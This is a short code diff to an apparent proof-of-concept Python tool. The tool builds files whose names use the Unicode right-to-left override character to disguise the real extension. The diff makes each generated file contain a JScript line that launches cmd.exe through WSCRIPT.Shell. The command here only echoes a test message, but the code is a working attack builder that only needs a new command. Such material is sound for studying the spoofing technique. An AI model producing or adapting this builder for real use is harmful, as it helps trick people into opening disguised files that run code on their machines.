@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-# Coded By: Joel A. Ossi
+# PoC By: Joel A. Ossi
 
 from __future__ import unicode_literals
 
@@ -15,7 +15,7 @@ exploit = u"‮"
 print('')
 
 file=open(filename + exploit + spoof + extention,'w')
-file.write("")
+file.write("var run=new ActiveXObject('WSCRIPT.Shell').Run('cmd.exe /k echo RTLO ATTACK PoC');")
 file.close()
 print('[+] Build Saved.')
 print('')
